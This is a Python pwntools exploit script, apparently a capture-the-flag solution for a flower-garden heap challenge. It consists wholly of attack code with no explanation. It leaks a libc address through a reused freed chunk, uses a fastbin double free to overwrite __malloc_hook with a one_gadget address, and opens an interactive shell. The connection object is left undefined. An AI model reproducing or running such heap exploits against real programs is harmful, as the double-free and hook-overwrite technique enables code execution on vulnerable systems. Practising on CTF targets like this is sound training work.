from pwn import *
#io=process("./back",env={"LD_PRELOAD":"./libc_64.so.6"})

def add(name,color,length):
    io.sendlineafter("Your choice : ","1")
    io.sendlineafter("Length of the name :",str(length))
    io.sendafter("The name of flower :",name)
    io.sendafter("The color of the flower :",color)
    io.sendline()

def view():
    io.sendlineafter("Your choice : ","2")

def remove(idx):
    io.sendlineafter("Your choice : ","3")
    io.sendafter("Which flower do you want to remove from the garden:",str(idx)) 
    io.sendline()

def clean():
    io.sendlineafter("Your choice : ","4")

def exit():
    io.sendlineafter("Your choice : ","5")

add("a","a",200)
add("b","b",200)
remove(0)
add("bbbbbbbb","b",100)   #this uses the chunk which was freed previousely
view()
io.recvuntil("Name of the flower[2] :bbbbbbbb") 
libc_leak=u64(io.recv(6)+"\x00\x00")           #leaking libc
print hex(libc_leak)
libc_base=libc_leak-0x3c3b78
hook=libc_base+0x3c3aed
one_gadget=libc_base+0xef6c4
add("a","a",96)
add("a","a",96)
add("a","A",250)
remove(3)
remove(4)
remove(3)

add(p64(hook),"a",96)
add("a","a",96)
add("a","a",96)
pay="a"*19+p64(one_gadget)
add(pay,"a",96)
remove(5)
#gdb.attach(io)
remove(5)
io.interactive()
